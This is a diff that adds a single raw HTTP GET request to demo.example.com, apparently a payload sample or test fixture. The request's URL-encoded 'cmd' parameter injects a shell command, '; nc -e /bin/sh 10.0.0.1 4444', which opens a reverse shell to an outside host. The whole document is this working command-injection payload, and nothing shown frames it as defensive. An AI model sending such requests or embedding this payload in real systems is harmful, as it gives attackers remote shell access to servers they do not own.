@@ -1,0 +1,4 @@
+GET /a?cmd=%3B%2Bnc%2B-e%2B%2Fbin%2Fsh%2B10.0.0.1%2B4444 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
